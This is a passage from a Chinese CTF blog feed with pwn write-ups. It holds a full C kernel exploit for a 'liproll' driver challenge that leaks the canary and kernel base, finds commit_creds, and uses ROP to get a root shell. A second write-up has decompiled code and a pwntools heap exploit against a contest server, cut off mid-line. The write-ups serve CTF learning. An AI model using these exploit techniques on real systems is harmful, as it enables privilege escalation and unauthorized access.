class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_CREATE 0xD3C7F03</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_CHOOSE 0xD3C7F04</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_RESET  0xD3C7F02</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CMD_CAST   0xD3C7F01</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">liproll</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="built_in">size</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> prepare_kernel_cred;</span><br><span class="line"><span class="keyword">uint64_t</span> commit_creds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm(</span><br><span class="line">        <span class="string">"mov user_cs, cs;"</span></span><br><span class="line">        <span class="string">"mov user_ss, ss;"</span></span><br><span class="line">        <span class="string">"mov user_sp, rsp;"</span></span><br><span class="line">        <span class="string">"pushf;"</span></span><br><span class="line">        <span class="string">"pop user_rflags;"</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[*] Status saved\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">privilege_escalation</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *(*pkc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">void</span> *(*cc)(<span class="keyword">void</span> *) = (<span class="keyword">void</span> *)commit_creds;</span><br><span class="line"></span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Root!\n"</span>);</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"[!] Failed!\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swapgs</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"swapgs;"</span></span><br><span class="line">        <span class="string">"iretq;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sub_rsp</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"sub rsp, 0x128;"</span></span><br><span class="line">        <span class="string">"ret;"</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/liproll"</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">        die(<span class="string">"open error"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    ioctl(fd, CMD_CREATE);</span><br><span class="line">    ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">0x180</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> canary = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] canary is: %p\n"</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite global_buffer = 0xdeadbeef</span></span><br><span class="line">    <span class="comment">// overwrite global_buffer size = 0x0</span></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">liproll</span> <span class="title">tmp</span> = </span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        .ptr = buf,</span><br><span class="line">        .<span class="built_in">size</span> = <span class="number">0x110</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak .data and .bss section</span></span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> _data_sec = ((*(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x18</span>) &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span>) + <span class="number">0x2000</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> _bss_sec = _data_sec + <span class="number">0x4C0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] .data section address is: %p\n"</span>, _data_sec);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] .bss section address is: %p\n"</span>, _bss_sec);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak vmlinux_base</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = _bss_sec + <span class="number">0x80</span>;</span><br><span class="line">    *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">8</span>;</span><br><span class="line">    tmp.ptr = buf;</span><br><span class="line">    tmp.<span class="built_in">size</span> = <span class="number">0x110</span>;</span><br><span class="line">    ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">    ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line">    <span class="built_in">read</span>(fd, buf, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> vmlinux_base = *(<span class="keyword">uint64_t</span> *)buf;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] vmlinux base is: %p\n"</span>, vmlinux_base);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite vmlinux_base = 0 to bypass liproll_read check</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)buf = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">write</span>(fd, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// find commit_creds and prepare_kernel_cred in __ksymtab</span></span><br><span class="line">    <span class="keyword">uint64_t</span> __ksymtab_start = vmlinux_base + <span class="number">0x12EE908</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] __ksymtab_start address is: %p\n"</span>, __ksymtab_start);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> found_commit_creds = <span class="number">0</span>, found_prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> found_do_sync_core = <span class="number">0</span>, found_intel_pmu_save_and_restart = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">0x12000</span>; i += <span class="number">0xFC</span>)&#123;</span><br><span class="line">        <span class="keyword">char</span> accept_buf[<span class="number">0x100</span>];</span><br><span class="line">        <span class="keyword">uint64_t</span> base_addr = __ksymtab_start + i;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = base_addr;</span><br><span class="line">        *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">0xFC</span>;</span><br><span class="line">        ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">        ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line">        <span class="built_in">read</span>(fd, accept_buf, <span class="number">0xFC</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>; j &lt; <span class="number">0xFC</span>; j += <span class="number">0xC</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> name_buf[<span class="number">0x100</span>];</span><br><span class="line">            <span class="keyword">uint32_t</span> func_offset = *(<span class="keyword">uint32_t</span> *)(accept_buf + j);</span><br><span class="line">            <span class="keyword">uint32_t</span> name_offset = *(<span class="keyword">uint32_t</span> *)(accept_buf + j + <span class="number">4</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> func_addr = ((<span class="keyword">uint32_t</span>)base_addr + func_offset + j) | (<span class="number">0xffffffff</span>ull &lt;&lt; <span class="number">32</span>);</span><br><span class="line">            <span class="keyword">uint64_t</span> name_addr = base_addr + name_offset + j + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">            *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = name_addr;</span><br><span class="line">            *(<span class="keyword">uint32_t</span> *)(buf + <span class="number">0x108</span>) = <span class="number">0x20</span>;</span><br><span class="line">            ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">            ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line">            <span class="built_in">read</span>(fd, name_buf, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">memcmp</span>(name_buf, <span class="string">"commit_creds"</span>, <span class="number">0xC</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[+] found commit_creds address is: %p\n"</span>, func_addr);</span><br><span class="line">                found_commit_creds = <span class="number">1</span>;</span><br><span class="line">                commit_creds = func_addr;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">memcmp</span>(name_buf, <span class="string">"prepare_kernel_cred"</span>, <span class="number">0x13</span>) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"[+] found prepare_kernel_cred address is: %p\n"</span>, func_addr);</span><br><span class="line">                found_prepare_kernel_cred = <span class="number">1</span>;</span><br><span class="line">                prepare_kernel_cred = func_addr;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(found_prepare_kernel_cred &amp;&amp; found_commit_creds)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// rop</span></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x110</span>) = canary;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x120</span>) = &amp;sub_rsp + <span class="number">8</span>; </span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x0</span>) = &amp;privilege_escalation; </span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x8</span>) = &amp;swapgs + <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x10</span>) = &amp;getshell;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x18</span>) = user_cs;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x20</span>) = user_rflags;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x28</span>) = user_sp;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span>) = user_ss;</span><br><span class="line">    </span><br><span class="line">    tmp.<span class="built_in">size</span> = <span class="number">0x128</span>;</span><br><span class="line">    ioctl(fd, CMD_CHOOSE, &amp;idx);</span><br><span class="line">    ioctl(fd, CMD_CAST, &amp;tmp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>简单提一下自己踩的坑：</p><ul><li>打印栈上残留的数据的时候，发现实际运行和调试的时候，得到的数据是不一样的，这里卡了很久；后面直接就不挂调试，而是直接dump栈上的数据，然后找有用的地址。</li><li>最后写rop的时候，内核栈放不下最后会crash，所以做一个小小的栈迁移；不过既然任何gadgets都可以在用户程序中构造，也很方便。</li><li>因为gadget是封装在用户态程序的函数体中的，所以需要跳过函数头才能直接执行到gadget本身，否则会有<code>push rbp</code>的执行。</li></ul></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/234263&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/234263&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;分享一下比赛中除了Deterministic Heap之外的&lt;del&gt;六&lt;/del&gt;五道题。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.com/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.com/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>钓鱼城杯初赛部分pwn</title>
    <link href="https://n0nop.com/2020/08/29/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86pwn/"/>
    <id>https://n0nop.com/2020/08/29/%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86pwn/</id>
    <published>2020-08-28T16:06:08.000Z</published>
    <updated>2021-04-01T05:44:19.197Z</updated>
    
    <content type="html"><![CDATA[<p>实习的倒数第二天在公司打的最后一场比赛了，贡献一点小小的力量，最后进前十了还是很开心的。但是只搞了两个pwn，剩下的babyrpc没有仔细看，vmpwn卡住了，就暂且写一下剩下部分的wp吧，其他的看看后面能不能搜到wp。</p><a id="more"></a><h2 id="unknown"><a href="#unknown" class="headerlink" title="unknown"></a>unknown</h2><h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol><li><p><code>__libc_start_main</code>首先会执行<code>init</code>函数，其中调用了<code>sub_1006</code>这个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_1006</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  mprotect((<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)&amp;loc_E57 &amp; <span class="number">0xFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">7</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    *((_BYTE *)&amp;loc_E57 + i) ^= <span class="number">0x33</span>u;</span><br><span class="line">  mprotect((<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> __int64)&amp;loc_E57 &amp; <span class="number">0xFFFFFFFFFFFF000</span>LL), <span class="number">0x1000</span>uLL, <span class="number">5</span>);</span><br><span class="line">  ((<span class="keyword">void</span> (__fastcall *)(<span class="keyword">void</span> *, __int64, __int64))loc_E57)(&amp;loc_FAF, <span class="number">16L</span>L, <span class="number">51L</span>L);</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))loc_FAF)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即对<code>0xE57</code>开始的15 bytes进行异或0x33的自解密，然后调用<code>mprotect</code>赋予执行权限。</p></li><li><p>写个脚本patch一下之后，得到另一个同样功能的函数，后面基本上是嵌套了，最后才是解密<code>main</code>函数和主逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">sub_FAF</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_E57((__int64)&amp;loc_EF9, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)main, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))loc_EF9)();</span><br><span class="line">  ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))loc_EF9)();</span><br><span class="line">  <span class="keyword">return</span> ((__int64 (*)(<span class="keyword">void</span>))loc_EF9)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_EF9</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  sub_E57((__int64)&amp;loc_A94, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_CD9, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_C01, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_B5D, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_D61, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  sub_E57((__int64)&amp;loc_A4B, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">  <span class="keyword">return</span> sub_E57((__int64)word_9EA, <span class="number">16</span>, <span class="number">51</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再最后写个脚本patch一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line">starts = [<span class="number">0xA94</span>, <span class="number">0xCD9</span>, <span class="number">0xC01</span>, <span class="number">0xB5D</span>, <span class="number">0xD61</span>, <span class="number">0xA4B</span>, <span class="number">0x9EA</span>, <span class="number">0xDB5</span>]</span><br><span class="line"><span class="keyword">for</span> start <span class="keyword">in</span> starts:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0x10</span>):</span><br><span class="line">        bytes = idc.Byte(start + i)</span><br><span class="line">        idc.PatchByte(start + i, bytes ^ <span class="number">0x33</span>)</span><br></pre></td></tr></table></figure></li><li><p>最后得到修复完成的<code>main</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  init_buf(a1, a2, a3);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( choice() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        add();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        <span class="keyword">delete</span>();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Unknown"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>利用点在于<code>add</code>功能下标存在上溢，可以修改最后一个chunk的size，从而再edit的时候创造一个heap overflow；然后就是直接用unsorted bin去leak出libc，然后tcache poisoning打<code>__free_hook</code>为<code>system</code>。</p></li><li><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys, os, re</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">p = remote(<span class="string">'122.112.212.41'</span>, <span class="number">6666</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">"Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"Your choice: "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line">main_arena_offset = <span class="number">0x3ebc40</span></span><br><span class="line">system_offset = libc.sym[<span class="string">"system"</span>]</span><br><span class="line">__free_hook_offset = libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xF8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    delete(i + <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(i + <span class="number">1</span>, <span class="number">0xF8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xF8</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"LIBCADDR\n"</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">"LIBCADDR"</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>, <span class="string">"\x00"</span>)) + <span class="number">0x36</span> - main_arena_offset</span><br><span class="line">__free_hook = libc_base + 